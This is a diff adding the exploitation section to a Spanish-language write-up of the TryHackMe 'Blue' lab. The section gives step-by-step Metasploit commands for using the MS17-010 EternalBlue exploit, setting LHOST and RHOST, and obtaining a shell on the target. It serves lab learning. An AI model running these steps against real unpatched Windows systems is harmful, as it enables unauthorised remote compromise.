@@ -81,7 +81,47 @@ Como podemos darnos cuenta, esta máquina es vulnerable a MS17-010, o también c
 
 ### [](#header-3)Fase De Explotación
 
-ABC
+Para esta segunda fase, _TryHackMe_ realiza la fase de explotación con el uso de `Metasploit`, no obstante, no recomiendo acostumbrarse a utilizar herramientas automatizadas, ya que perdemos bastante el control sobre lo que está pasando por detrás, de modo que no aprendemos; sin embargo, en esta máquina en concreto, no es posible realizar un procedimiento manual, ya que la máquina `Blue`, está pensada para ser explotada mediante el uso de `Metasploit`.
+
+Para hacer uso de `Metasploit` tendremos que abrir la aplicación, para ello haremos lo siguiente:
+
+```  
+msfconsole
+```
+
+Una vez hemos abierto `Metasploit`, procederemos a buscar aquello que queremos explotar, en este caso, MS17-010, o `EternalBlue`, cualquiera de las dos formas es válidas.
+
+```    
+search eternalblue
+search ms17-010
+```
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/5.png)
+
+Posteriormente elegiremos el _exploit_ a utilizar; de hecho, una de las preguntas de la plataforma justamente es, introducir el _exploit_ que vamos a utilizar.
+
+```      
+use exploit/windows/smb/ms17_010_eternalblue
+```  
+
+Una vez hemos seleccionado el _exploit_, procederemos a configurar tanto el `LHOST` como el `RHOST`, que dicho de otra forma, procederemos a introducir nuestra _IP_, y la _IP_ de la máquina víctima.
+
+```      
+show options
+```
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/6.png)
+
+```      
+set LHOST <nuestra IP> 
+set RHOST <IP víctima>
+```
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/7.png)
+
+Una vez hemos configurado dichos parámetros, bastará con empezar con el ataque, consiguiéndonos `Metasploit` una shell dentro de la máquina víctima.
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/8.png)
 
 ### [](#header-3)Escalada De Privilegios
 
